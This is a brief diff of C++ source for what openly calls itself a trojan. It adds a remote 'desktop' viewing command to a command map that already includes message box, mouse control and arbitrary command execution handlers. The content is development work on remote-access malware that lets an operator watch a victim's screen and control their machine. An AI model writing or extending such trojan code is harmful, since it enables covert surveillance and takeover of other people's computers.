@@ -37,6 +37,7 @@ using trojan_task = std::function<VOID(CONST PVOID, std::string&)>;
 CONST std::map<std::pair<std::string, Command>, trojan_task> MAP_COMMANDS
 {
 	{ { TEXTH("message"), Command::MESSAGEBOX }, _on_task_MESSAGEBOX },
+	{ { TEXTH("desktop"), Command::VIEWDESKTOP_START }, _on_task_VIEWDESKTOP },
 	{ { TEXTH("mouse"  ), Command::MOUSECTRL  }, _on_task_MOUSECTRL  },
 	{ { TEXTH("execute"), Command::EXECUTECMD }, _on_task_EXECUTECMD }
 };
